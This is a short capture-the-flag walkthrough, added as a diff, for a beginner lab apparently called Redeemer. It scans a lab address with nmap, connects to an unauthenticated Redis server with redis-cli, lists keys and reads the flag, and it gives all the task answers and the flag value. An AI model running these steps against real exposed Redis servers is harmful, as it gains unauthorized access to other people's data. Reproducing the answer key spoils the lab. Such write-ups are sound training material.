@@ -1,0 +1,68 @@
+Machine Redeemer
+
+We use a nmap first
+  nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn -sV 10.129.75.127
+
+  PORT     STATE SERVICE REASON  VERSION
+  6379/tcp open  redis   syn-ack Redis key-value store 5.0.7
+
+Task 1 Which TCP port is open on the machine?
+  6379 
+
+Task 2 Which service is running on the port that is open on the machine?
+  redis 
+
+What is Redis?
+Redis (REmote DIctionary Server) is an open-source advanced NoSQL key-value data store used as a
+database, cache, and message broker.
+
+We install redis-tools
+  sudo apt install redis-tools
+Then use redis-cli --help
+We see -h <hostname> Server hostname (default: 127.0.0.1).
+
+And use redis-cli -h 10.129.75.127
+  redis-cli -h 10.129.75.127
+  10.129.75.127:6379>
+
+We use the command 'info' to see all that we need
+
+
+Task 3 What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database 
+  In-memory Database 
+  We see that all the information are in memory 
+
+Task 4 Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.
+  redis-cli
+
+Task 5 Which flag is used with the Redis command-line utility to specify the hostname?
+  -h 
+
+Task 6 Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?
+  info 
+
+Task 7 What is the version of the Redis server being used on the target machine?
+  5.0.7
+
+Task 8 Which command is used to select the desired database in Redis?
+  select
+
+Task 9 How many keys are present inside the database with index 0?
+  4
+
+Then use 'keys *'
+  10.129.75.127:6379> keys *
+  1) "temp"
+  2) "numb"
+  3) "flag"
+  4) "stor"
+
+Task 10 Which command is used to obtain all the keys in a database?
+  keys *
+
+Then you see the keys with 'get'
+  10.129.75.127:6379> get flag
+  "03e1d2b376c37ab3f5319922053953eb"
+
+Task 11 Submit root flag
+  03e1d2b376c37ab3f5319922053953eb
